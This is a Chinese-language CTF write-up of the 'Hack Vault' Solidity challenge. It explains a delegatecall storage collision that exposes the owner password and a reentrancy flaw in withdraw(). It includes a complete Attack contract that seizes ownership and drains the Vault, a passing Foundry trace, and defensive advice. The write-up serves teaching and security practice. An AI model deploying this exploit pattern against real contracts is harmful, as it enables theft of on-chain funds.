# Vault CTF 攻击分析

## 题目概述

安全挑战：Hack Vault

题目#1
Fork 代码库：
https://github.com/OpenSpace100/openspace_ctf

阅读代码  Vault.sol 及测试用例，在测试用例中 testExploit 函数添加一些代码，设法取出预先部署的 Vault 合约内的所有资金。
以便运行 forge test 可以通过所有测试。

可以在 Vault.t.sol 中添加代码，或加入新合约，但不要修改已有代码。

请提交你 fork 后的代码库链接。

## 代码分析

本题包含两个合约：
- **VaultLogic**: 包含 `owner` 和 `password` 变量，以及 `changeOwner` 函数
- **Vault**: 主合约，包含 deposit/withdraw 逻辑，使用 `delegatecall` 转发未匹配的函数调用到 VaultLogic

目标是清空 Vault 合约中的所有资金。

## 漏洞分析

### 1. delegatecall 存储槽冲突

这是本题的核心漏洞。当 `Vault` 通过 `delegatecall` 调用 `VaultLogic` 时，代码在 `Vault` 的存储上下文中执行。

**VaultLogic 存储布局：**
| Slot | 变量 |
|------|------|
| 0    | `owner` |
| 1    | `password` |

**Vault 存储布局：**
| Slot | 变量 |
|------|------|
| 0    | `owner` |
| 1    | `logic` (VaultLogic 地址) |
| 2    | `deposites` mapping |
| 3    | `canWithdraw` |

当 `VaultLogic.changeOwner` 在 Vault 上下文中执行时：
- 它检查的 `password` 实际上读取的是 Vault 的 **slot 1**
- Vault 的 slot 1 存储的是 `logic` 合约的地址
- **因此，密码就是 VaultLogic 合约的地址！**

### 2. 重入攻击 (Reentrancy)

`withdraw()` 函数存在经典的重入漏洞：

```solidity
function withdraw() public {
    if(canWithdraw && deposites[msg.sender] >= 0) {
        (bool result,) = msg.sender.call{value: deposites[msg.sender]}("");
        if(result) {
            deposites[msg.sender] = 0;  // 状态更新在外部调用之后
        }
    }
}
```

问题：
1. 外部调用 (`msg.sender.call`) 在状态更新之前执行
2. 攻击者的 `receive()` 函数可以再次调用 `withdraw()`
3. 由于 `deposites[msg.sender]` 还未清零，攻击者可以多次提款

## 攻击步骤

1. **修改 Owner**: 利用 delegatecall 存储冲突，使用 VaultLogic 地址作为密码调用 `changeOwner`
2. **存款**: 向 Vault 存入 0.1 ETH
3. **开启提款**: 调用 `openWithdraw()` (只有 owner 可以调用)
4. **重入攻击**: 调用 `withdraw()`，在 `receive()` 中递归调用 `withdraw()` 直到清空 Vault

## 攻击合约

```solidity
contract Attack {
    address public logicAddress;
    address public vaultAddr;

    constructor(address _logicAddress, address _vaultAddr) {
        logicAddress = _logicAddress;
        vaultAddr = _vaultAddr;
    }

    receive() external payable {
        if (vaultAddr.balance >= 0.1 ether) {
            IVault(vaultAddr).withdraw();
        }
    }    

    function startAttack() public {
        // 1. 使用 logic 地址作为密码修改 owner
        (bool success, bytes memory data) = vaultAddr.call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)", 
                bytes32(uint256(uint160(logicAddress))),  // password = logic 地址
                address(this)
            )
        );

        // 2. 存款 0.1 ether
        IVault(vaultAddr).deposite{value: 0.1 ether}();
        
        // 3. 开启提款
        IVault(vaultAddr).openWithdraw();

        // 4. 重入攻击提款
        IVault(vaultAddr).withdraw();
    }
}
```

## 测试日志

```
Ran 1 test for test/Vault.t.sol:VaultExploiter
[PASS] testExploit() (gas: 451365)
Traces:
  [471265] VaultExploiter::testExploit()
    ├─ [0] VM::deal(SHA-256: [0x0000000000000000000000000000000000000002], 1000000000000000000 [1e18])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return]
    ├─ [340038] → new Attack@0xE536720791A7DaDBeBdBCD8c8546fb0791a11901
    │   └─ ← [Return] 1474 bytes of code
    ├─ [0] VM::deal(Attack: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901], 1000000000000000000 [1e18])
    │   └─ ← [Return]
    ├─ [85193] Attack::startAttack()
    │   ├─ [11125] Vault::fallback(...)
    │   │   ├─ [5818] VaultLogic::changeOwner(...) [delegatecall]  // ✅ 成功修改 owner
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [22560] Vault::deposite{value: 100000000000000000}()    // ✅ 存款
    │   │   └─ ← [Stop]
    │   ├─ [22488] Vault::openWithdraw()                          // ✅ 开启提款
    │   │   └─ ← [Stop]
    │   ├─ [17088] Vault::withdraw()                              // ✅ 第一次提款
    │   │   ├─ [9099] Attack::receive{value: 100000000000000000}()
    │   │   │   ├─ [8308] Vault::withdraw()                       // ✅ 重入：第二次提款
    │   │   │   │   ├─ [319] Attack::receive{value: 100000000000000000}()
    │   │   │   │   │   └─ ← [Stop]                               // Vault 余额不足，停止重入
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [461] Vault::isSolve() [staticcall]
    │   └─ ← [Return] true                                        // ✅ 攻击成功！
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

## 运行测试

```bash
forge test -vvvv
```

## 防御建议

1. **Checks-Effects-Interactions 模式**: 在外部调用之前更新状态
2. **使用 ReentrancyGuard**: 添加重入锁防止递归调用
3. **避免 delegatecall 存储冲突**: 确保代理合约和逻辑合约的存储布局一致
4. **私有变量不是真的私有**: 区块链上的所有数据都是公开的，不要用来存储敏感信息
